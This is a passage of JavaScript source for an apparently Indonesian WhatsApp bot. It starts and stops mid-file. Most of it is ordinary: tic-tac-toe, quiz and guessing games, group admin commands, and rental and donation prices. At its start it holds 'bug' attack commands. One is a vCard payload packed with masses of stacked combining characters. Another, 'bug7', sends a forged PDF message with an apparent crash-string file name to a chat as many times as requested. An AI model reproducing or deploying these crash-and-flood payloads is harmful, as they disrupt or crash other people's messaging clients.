̴̴̶̸̷̴̧̧̛̥̖̙͘̕̕̕͢͟͢͜͠͞.̸͔̱̣̠̠̯̼̓̏ͪ̏̍̌̇̑̒̈́͋̒ͩͪ̚͏̵̴̷̛͘͘͞͞͡.̸̸̡̧̣̥̖͍̥̗̭̮̩̩̬̰͕͍̳̺̗̬̔͋͊ͫ̈́̀ͣͭͭ̇̊͒̕͘͡͡͝͝.͙͈͇̤̟͎̋͢͝.̢̤̗̖͍͉̗̞̣̹̭̪͓̏ͮ̿͝͡.̴̬̭͈͖̣͚͉̫̩̟̠̭̬̞͙̗̘̥̞̌̅͆̍ͥ̾̀́̍̀ͮ̏ͪͥ̒͜ͅ.̶͍̞̫͉̖ͣ̉͑ͣͩ̂ͬ͋̾ͫ͑͊͐ͤ̓̿̚͟͏̴̶͘͟͏.̡̢͕̞̞̥̭̗̜͍̞͔̫͖͙̣̯̱̝̓͆̂ͤ̐ͩͤ̒̑̌̈̆̄̆̽̓̒͜҉̸͟͡͡҉̵̢̨̕͘̕͘͜͡.̶̸̡͔̗͚̖̗̝ͤ̍̂̓̔́́͢͠.̷̢̯̭͖̹͈̣̲͕͖̦̯̬̮̺͚̇͋ͯ̓́̕͘͜͟͞҉̵̡̢́͞.̷̴̨͖̮̟̰̼̣͂̈́̽̐̈̉͗ͫͥ̉̾̚̚͘.̵̸̸̵̡̱͖̹͓͕̫̘̫̖̬̠̼͖͓̬̹̽͋͐̇͋̿ͨ̾̀͘̕͟͝͝͠͝.ͤͯ̍ͦ̐̀̏̇͛ͭ̿̀ͯ̒.͍͙͉ͭ͐͊͑̍̇͐͗ͬ̆̄̏͑̑ͅ.̸̸̢̛̤͉̦͍͈͔͇̤̼͍̟͔̣͍̬̠̫̍̑̋͒̓̈́̕ͅͅ҉͏̵҉̶̵̵̀̕͠͡͠.̶̷̷̵̵̨̡̏ͮͤ̏ͮ͆ͪ̅͛̈͐̾͂̃ͫ̏̄̾̀͜͜͞͞͝.̛͔̳ͤ̏͊ͪ̍͗̆̉͂ͥ̈̈͗̀͌̾̎̚͘͏̶̢́͢͞.̛͓̻̲̼̪̝̓̅͘͜҉̷̶̵̸̨̛̛͘͠͝.̷̶̨̝͌̑́ͨ͌ͭ̕̕͝͠.̸̴̨̨̟̪̩ͧ̒͛͆̉͒͗̃͂̆́̾ͯ͗͊ͣͅ҉̛̛̛́͘͜.̵̬̦̼͉͔̭̳̩̣̼͈͖̫͖̗͓͙̤̽̉ͩ́̓́ͧ̄ͫ̒ͫͮͤͪ́.̵̸̨̢̛͇͈̬̪͇͖̘̞͍͙͓̖͖̙̱ͮͦ̌͆̾̀̓̃ͥ̄ͣ̏́̾̓͐͐̕͘͘͡͏́͠͝.̧̡̣̲̣̜̬ͩ̽̅̊ͣ͊̕.̴͖͕̣͓͖̳͚̯̥̙̬͚̮͍̬̟͂̐̓̽̃̚̚͟͏̷̷̴̷̨̢̛̛́͝.̸̵̨̛̝͉̐́̕͝͞ͅ.̷̵̼̬̯ͬ̀ͨͤͦ͆̃̽̑̂ͪ̈̈́͋͝͠͝ͅ͏̷̨̀́͟͡͝͠.̥̺̮̳̜̻͖͎͈̞̟̭̮̊́͏̶́͘͜͟͢͏̴̵̢͟.̷̶̝̼̲̮͒͂̎̈̑̂̂̓ͤ̓̒̊̏͐̉͗̋̚͡.̨̮̼̻̪̟̦̼̙̜̘̟̳̔͋̄̀͂͛͆̓ͮ̓ͤ̅ͯ̏ͫͦͫ̆ͦ͘͡ͅ҉̴̵̡̧̨̧̛̀̕͡҉.͍͕̊ͥͤ̂̃̿̑̐̔ͤ̊ͅ.̴̴̵̘̙̱ͥͭ͑ͨ̔̌͘͢͜͢͝͝͝͞҉̴́͜҉͞.̛̖͈̯̦̬̙̰̰̣͙̳̮͉̞̹̰̬̟̾̾ͅ͏̴̀.̷̷̨̛̳͎͔̮̮͍̼̤̗̪̠̉̃̂͑̅͊͜.̮̯̞̠̩̫̝͙̼͉͕͒ͥ̈́̐̐̇ͯ̓҉́҉̸̶̶̢̀́͘͟͜͢͢͞͞҉͜҉.̶̯͉͎̟̉ͤ̋̾ͦ͒̽̀͘͞͝͡ͅ.͂ͩͪ̒ͧ̃̽ͭ͜҉̷͏̛.̢̬͔̤͇͙̠̠̣̝̭̤͓̭̤͖͇̻̤̎͂̑ͧ̍ͨ̆͋ͫ͆̈̍ͯ͛ͮͭ͛ͪ̚ͅͅ͏̡҉̷̛͠͏͞҉̶.̰̹̜̮̮͕̜̘̲̭͉̠̞͓̙̼͇̥͎͌͏̸̴̡̡̀͟͢͢͠҉̵̴̶͏̨̕͟.̜̰̗̱̣̂̇́̃͐͂̌ͤ͗̂̂ͯͭͨ͆̀ͥ̈͒̀́̚͘.̡͓͎̜͇̖̝̯͉͖͈̯͕̰̙̟̻͂͌ͦͧͭͣ̿͐͒ͫ̓̀͞ͅ.̶̶̸̙̻͎̟̻͈̬͇͈̙̗̬̜̞͙ͪ͗ͮ̏̐͠͠͞͡͏.̶̸̢̢̬̖͇̲̩ͩͫͧ͐̇̽̈ͤ̚͘͠͏̷̨͘̕͟҉.̪̥͖̳͚̖̘͈͎̘͕́̍͌́ͧ́̂̌̅̀̚͏͠҉͠.̢̬̼̝̻̭͖ͤ͛̕͢͢͜.̴͖̗͎̗̘̲̫͎̝̮̤̣̀̅̆͆͋ͮ.̷̮̺̠̪̰͍̝̲̌ͮ̂͑͂͛͐̓ͭ͛͒̽̉ͮ̅̕͢͢͠͝.̷̴̶̡̧̨̢̡̛̛̛̜̦͓͎̙͖̼̱͈̺̪̬̝̏ͩ̄̍̈́̊̉̇ͤͣ̏̂̌̽̃̉̉ͫͨ̔͢.̵̛̺̕͢͞͏͜҉̶̵̶̨̨͝͏̨.̵̨̧͚̆͒̀̽̊̊͛ͬ̓͛̌.̴̫͖̍̃̒̓̏͊͒̔͐́͝͏́͝҉͢͏̢͘.̸̤̲̻̝̞͙̠̆̌͑̐͑ͣ̒̃̒̈́̅͋̆̓ͣͩ̅̑́ͮ.̵̶̢̢͖͕ͯ͛͛̉̔͋ͯ̐ͧ̔͒̿̿̏͒ͣ̓́͘͘͟͡.̛̏͢.̴̷̡̧̺̘̘̪̬̜͕̜̦ͩ͋ͤ̃́́̕͘͜҉.̠̰͈̯̥̽̽̀̉̾ͤ̈́̉͒̈́҉̶͢.̢̢͍͍̻͈̹̥͚͕̱̯̖͖̈͌ͭͥ̈̎̽ͫ̐̌͂̇ͦ̾ͫ̉́̀͜҉҉̡̨̢̛́͘͠͝͏͝͝.̷̧̧̞̖̳̬͍ͫ̍͐ͨ̂̿̏̋̊͗ͫ́̚̕͘͘͏̸̨́҉̸.̴̧̬̗̘̮̗̻̳̬̯̠͈̰̭͉̤̝̞͉̩ͮ̎̂ͮ͒̉̒̿̋ͯͥ͊̄̕͟͝ͅ͏̶̨̛͘̕̕͜.̷̜͇̥̠̩͍͙̭̞͔̟̯̟͈̞͕͏̵̧͠.̸̢̧̡̱̱͕̞͖̤̞̮̩̱̮͚͚̥͖͍͙͓̋͑́̏̀̀͘͘͢͜͞͝͠͡͏̡.̸̶̢̞̱̻̩̝͖̯ͮ̓ͬ̔̀ͮͮ̀̀͢ͅ.̸̢̢̡̛̪͖̫͓̖̙̬̪̰̰͔͚̘̲̖̗̂̆̓ͯ͗͌̍͠͠͝.̱͉̞͖̯̺̈͆̇͠͏̶̵̵̸̶̵̸̶̨̨̧͘͟͜͢͡.͍̮͈͖͖̤͉͙̖͔̰̘͖̟͙̰ͣ̔ͣͪ́.̵̷̮̜̠̫̝͍̤͓̟̮̯̭̩͓̍́̀͞͝ͅ.̵̵̵̴̧̛͛͌͌̄ͥ̆͊͛͆͛̈̒͂̇̕̕͜͠͏̀͟҉͏́͞͡͞.̸̵̷̶̴̡̢̥̭̜͕̝̪͓̇ͨͫͣ̇̒͛ͯͯ̽̀̈̀͠͞͞.̢̢̡̢̯̣̺̗̆̋͑͛̀́͜͢͝͠.̨̡̧̠͍̙͑ͮ̓ͯͩ̊ͣ͆̐͗̈́̓̐̽͂̀̀́̕.͊̃͒ͤ͛̏̃̔̎͆̇̃\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME\\,INTERNET\\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nEND:VCARD"
 }
   }
}
bacito(m.chat, `© THE JO BOT VCARD`, main)
}
}
break
//=================================================//
case 'bug7': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/pdf",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `THE JO BOT ${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
 }
   }
}
bacot(m.chat, `© THE JO BOT PDF`, main)
}
}
break

        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await hisoka.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await hisoka.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            hisoka.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await hisoka.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
	    if (!isCreator) return
                hisoka.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/74fd634010128be37972c.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n│➳ 13k Per Group via E-Walet 1 Month\n│➳ 18k via pulsa 1 Month\n\n Premium Price Bot\n│➳ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/628384180078 (Owner)\n\nDonate For Me : \n\n│➳ Paypal : https://www.paypal.me/Cakhaho\n│➳ Saweria : https://saweria.co/DikaArdnt` }, { quoted: m })
            }
            break
            case 'beli nomer luar negri': {
                m.reply('Mau bli???\nChat ini https://wa.me/6283841800798?text=bang+beli+nomer')
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    hisoka.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    hisoka.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    hisoka.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    hisoka.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    hisoka.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    hisoka.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    hisoka.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await hisoka.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await hisoka.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    hisoka.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, hisoka.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                hisoka.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, hisoka.user.name, m, {mentions: menst})
            }
            break
            case 'react': {
                if (!isCreator) return
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                hisoka.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) return
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await hisoka.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) return
                await hisoka.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) return
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n│➳ Packname : ${global.packname}\n│➳ Author : ${global.author}`)
            }
            break
	case 'kick': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
	if (!isCreator) return
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
	    if (!isCreator) return
		if (!m.isGroup) throw mess.group
        if (!isBotAdmins) throw mess.botAdmin
        if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) return
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
	    if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
          if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) return
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!isCreator) return
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
